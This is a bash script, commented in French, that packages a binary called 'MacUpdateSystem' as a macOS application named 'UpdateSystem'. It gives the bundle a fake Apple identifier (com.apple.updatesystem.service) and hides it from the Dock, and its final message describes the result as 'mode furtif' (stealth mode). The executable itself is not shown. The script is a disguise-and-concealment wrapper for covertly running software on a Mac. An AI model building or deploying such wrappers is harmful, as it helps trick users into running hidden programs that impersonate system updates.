#!/bin/bash

# Nom que tu veux donner à l'application finale
APP_NAME="UpdateSystem"
SOURCE_BINARY="MacUpdateSystem"

echo "Construction de $APP_NAME.app..."

# 1. Créer la structure des dossiers (.app/Contents/MacOS)
mkdir -p "$APP_NAME.app/Contents/MacOS"
mkdir -p "$APP_NAME.app/Contents/Resources"

# 2. Copier l'exécutable (et le renommer pour qu'il matche l'app)
cp "$SOURCE_BINARY" "$APP_NAME.app/Contents/MacOS/$APP_NAME"
chmod +x "$APP_NAME.app/Contents/MacOS/$APP_NAME"

# 3. Créer le fichier Info.plist (C'est la carte d'identité de l'app)
# L'option LSUIElement = true est la clé pour le rendre INVISIBLE dans le Dock
cat > "$APP_NAME.app/Contents/Info.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>$APP_NAME</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.updatesystem.service</string>
    <key>CFBundleName</key>
    <string>$APP_NAME</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>LSUIElement</key>
    <true/>
</dict>
</plist>
EOF

echo "✅ Application créée : $APP_NAME.app"
echo "👉 Tu peux maintenant double-cliquer dessus. Rien n'apparaîtra (mode furtif)."
